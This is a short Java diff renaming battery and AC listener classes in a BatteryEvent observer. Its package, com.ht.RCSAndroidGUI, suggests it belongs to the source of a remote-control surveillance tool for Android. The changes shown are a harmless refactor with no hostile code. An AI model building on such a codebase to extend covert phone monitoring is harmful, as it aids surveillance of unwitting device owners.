@@ -7,8 +7,8 @@ import android.util.Log;
 import com.ht.RCSAndroidGUI.Battery;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
-import com.ht.RCSAndroidGUI.listener.AcListener;
-import com.ht.RCSAndroidGUI.listener.BatteryListener;
+import com.ht.RCSAndroidGUI.listener.ListenerAc;
+import com.ht.RCSAndroidGUI.listener.ListenerBattery;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 
 public class BatteryEvent extends EventBase implements Observer<Battery> {
@@ -20,12 +20,12 @@ public class BatteryEvent extends EventBase implements Observer<Battery> {
 	
 	@Override
 	public void begin() {
-		BatteryListener.self().attach(this);
+		ListenerBattery.self().attach(this);
 	}
 
 	@Override
 	public void end() {
-		BatteryListener.self().detach(this);
+		ListenerBattery.self().detach(this);
 	}
 
 	@Override
